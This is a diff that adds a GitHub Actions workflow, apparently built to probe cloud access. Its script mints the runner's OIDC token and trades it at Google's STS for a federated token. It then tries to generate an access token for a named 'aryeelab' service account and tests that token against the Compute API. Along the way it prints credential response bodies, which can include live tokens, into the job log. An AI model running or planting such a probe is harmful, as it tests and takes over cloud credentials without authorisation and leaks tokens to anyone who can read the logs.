@@ -1,0 +1,63 @@
+name: c211-i81359-authprobe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: authprobe
+        run: |
+          python3 - <<'PY'
+          #!/usr/bin/env python3
+          import json, os, subprocess, urllib.request, urllib.error, urllib.parse
+          PROV = 'projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          SA = 'github-actions@aryeelab.iam.gserviceaccount.com'
+          def http(method, url, body=None, headers=None, timeout=60):
+              h = dict(headers or {})
+              data = body.encode() if body is not None else None
+              req = urllib.request.Request(url, data=data, headers=h, method=method)
+              try:
+                  with urllib.request.urlopen(req, timeout=timeout) as f:
+                      return f.status, f.read()
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()
+              except Exception as e:
+                  return 0, str(e).encode()[:300]
+          base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+          tok = ''
+          if base:
+              u = base + '&audience=' + urllib.parse.quote('//iam.googleapis.com/' + PROV, safe='')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u], capture_output=True, text=True).stdout
+              try:
+                  tok = json.loads(out).get('value', '')
+              except Exception:
+                  tok = ''
+          print('RESULT ' + json.dumps({'step': 'mint', 'ok': bool(tok), 'len': len(tok or '')}), flush=True)
+          if not tok:
+              raise SystemExit(0)
+          body = json.dumps({'audience': '//iam.googleapis.com/' + PROV,
+                             'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                             'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                             'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                             'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+                             'subjectToken': tok})
+          st, rb = http('POST', 'https://sts.googleapis.com/v1/token', body, {'Content-Type': 'application/json'})
+          print('RESULT ' + json.dumps({'step': 'sts', 'http': st, 'body': rb.decode('utf-8', 'replace')[:500]}), flush=True)
+          if st != 200:
+              raise SystemExit(0)
+          fed = json.loads(rb).get('access_token')
+          b = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'})
+          st2, rb2 = http('POST', 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(SA, safe=''), b,
+                          {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (fed or '')})
+          print('RESULT ' + json.dumps({'step': 'gen', 'http': st2, 'body': rb2.decode('utf-8', 'replace')[:500]}), flush=True)
+          if st2 == 200:
+              sat = json.loads(rb2).get('accessToken', '')
+              st3, rb3 = http('GET', 'https://compute.googleapis.com/compute/v1/projects/aryeelab/regions/us-central1',
+                              headers={'Authorization': 'Bearer ' + sat})
+              print('RESULT ' + json.dumps({'step': 'reader', 'http': st3, 'ok': 'us-central1' in rb3.decode('utf-8', 'replace')}), flush=True)
+          PY
